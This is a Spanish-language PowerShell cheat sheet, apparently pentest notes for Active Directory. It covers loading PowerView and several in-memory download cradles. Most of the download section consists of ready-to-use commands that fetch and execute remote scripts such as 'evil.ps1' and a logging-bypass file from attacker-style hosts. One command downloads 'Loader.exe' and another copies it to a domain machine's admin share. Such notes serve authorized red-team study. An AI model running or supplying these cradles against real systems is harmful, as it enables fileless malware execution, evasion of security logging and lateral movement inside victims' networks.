# Powershell 

Tags: #Powershell #AD #Comandos 

## Cargar e importar un script 

```powershell 
❯ C:\AD\PowerView.ps1                   # Cargar un script 

❯ Import-Module C:\AD\PowerView.psd1    # Importar un modulo 

❯ Get-Command -Module <ModuleName>      # Listar modulos 
```

## Descargar un script 

* [Invoke-CradleCrafter](https://github.com/danielbohannon/Invoke-CradleCrafter)

**NOTA:** Cuando se descargan herramientas en memoria usando `IEX (New-Object Net.WebClient).DownloadString(...)` en PowerShell con Github, el enlace debe apuntar siempre a la **versión RAW del archivo** y no a la página normal del repositorio. Esto se debe a que `IEX` necesita recibir únicamente el **código del script en texto plano** para poder interpretarlo y ejecutarlo; si se utiliza un enlace que no es RAW, lo que se descargará será HTML de la página web y el script no podrá ejecutarse correctamente.

```powershell 
❯ IEX (New-Object Net.WebClient).DownloadString('https://webserver/payload.ps1')  # Descargar executable en memoria 

❯ IEX (iwr http://IP/sbloggingbypass.txt -UseBasicParsing) 
❯ iwr http://IP/Loader.exe -OutFile C:\Users\Public\Loader.exe 

❯ echo Y | xcopy C:\Users\Public\Loader.exe \\dcorp-mgmt\C$\Users\Public\Loader.exe 

❯ $ie=New-Object -ComObject InternetExplorer.Application;$ie.visible=$False;$ie.navigate('http://192.168.230.1/evil.ps1');sleep 5;$response=$ie.Document.body.innerHTML;$ie.quit();iex $response

❯ PSv3 onwards - iex (iwr 'http://192.168.230.1/evil.ps1')

❯ $h=New-Object -ComObject Msxml2.XMLHTTP;$h.open('GET','http://192.168.230.1/evil.ps1',$false);$h.send();iex ❯ $h.responseText

❯ $wr = [System.NET.WebRequest]::Create("http://192.168.230.1/evil.ps1")
❯ $r = $wr.GetResponse()
IEX ([System.IO.StreamReader]($r.GetResponseStream())).ReadToEnd()
```

## Comandos básicos 

```powershell 
❯ $env:username         # Mirar usuario del dominio 
❯ $env:computername     # Mirar el nombre del computador 

❯ ls env:               # Listar las variables de entorno 

❯ Enter-PSSession computername 
	❯ gpupdate /force 

❯ set username 
```